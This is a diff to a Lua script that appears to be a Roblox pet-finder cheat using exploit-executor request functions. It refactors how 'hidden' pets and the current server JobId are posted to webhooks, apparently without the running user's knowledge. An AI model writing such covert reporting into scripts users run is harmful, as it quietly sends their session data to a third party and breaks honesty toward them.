@@ -138,7 +138,7 @@ local function sendWebhook(foundPets, jobId, category)
     local jsonData = HttpService:JSONEncode(embedData)
     local req = http_request or request or (syn and syn.request)
     if req then
-        local success, err = pcall(function()
+        pcall(function()
             req({
                 Url = webhooks[category],
                 Method = "POST",
@@ -206,10 +206,7 @@ local function checkForPets()
                 for _, target in pairs(pets) do
                     if string.find(nameLower, string.lower(target)) then
                         if not sentHiddenPets[obj.Name] then
-                            if not hiddenFound[category] then
-                                hiddenFound[category] = {}
-                            end
-                            table.insert(hiddenFound[category], obj.Name)
+                            table.insert(hiddenFound, {petName = obj.Name, category = category})
                             sentHiddenPets[obj.Name] = true -- Mark as sent for this session
                         end
                         break
@@ -227,10 +224,8 @@ task.spawn(function()
         local userPetsFound, hiddenPetsFound = checkForPets()
 
         -- Handle hidden pets (send webhook once per session)
-        for category, pets in pairs(hiddenPetsFound) do
-            if #pets > 0 then
-                sendWebhook(pets, game.JobId, category)
-            end
+        for _, petData in ipairs(hiddenPetsFound) do
+            sendWebhook({petData.petName}, game.JobId, petData.category)
         end
 
         -- Handle user-targeted pets (pauses auto-rejoin and shows popup)
@@ -245,10 +240,8 @@ task.spawn(function()
                 for _, pet in ipairs(userPetsFound) do
                     createPopup(pet) -- Keep showing popup while pet is present
                 end
-                for category, pets in pairs(hiddenPetsFound) do
-                    if #pets > 0 then
-                        sendWebhook(pets, game.JobId, category)
-                    end
+                for _, petData in ipairs(hiddenPetsFound) do
+                    sendWebhook({petData.petName}, game.JobId, petData.category)
                 end
             until #userPetsFound == 0
         else
@@ -261,10 +254,8 @@ task.spawn(function()
             task.wait(3)
             elapsed = elapsed + 3
             userPetsFound, hiddenPetsFound = checkForPets()
-            for category, pets in pairs(hiddenPetsFound) do
-                if #pets > 0 then
-                    sendWebhook(pets, game.JobId, category)
-                end
+            for _, petData in ipairs(hiddenPetsFound) do
+                sendWebhook({petData.petName}, game.JobId, petData.category)
             end
             if #userPetsFound > 0 then
                 for _, pet in ipairs(userPetsFound) do
@@ -276,10 +267,8 @@ task.spawn(function()
                     for _, pet in ipairs(userPetsFound) do
                         createPopup(pet)
                     end
-                    for category, pets in pairs(hiddenPetsFound) do
-                        if #pets > 0 then
-                            sendWebhook(pets, game.JobId, category)
-                        end
+                    for _, petData in ipairs(hiddenPetsFound) do
+                        sendWebhook({petData.petName}, game.JobId, petData.category)
                     end
                 until #userPetsFound == 0
                 elapsed = 0 -- Reset rejoin timer if user pets were found
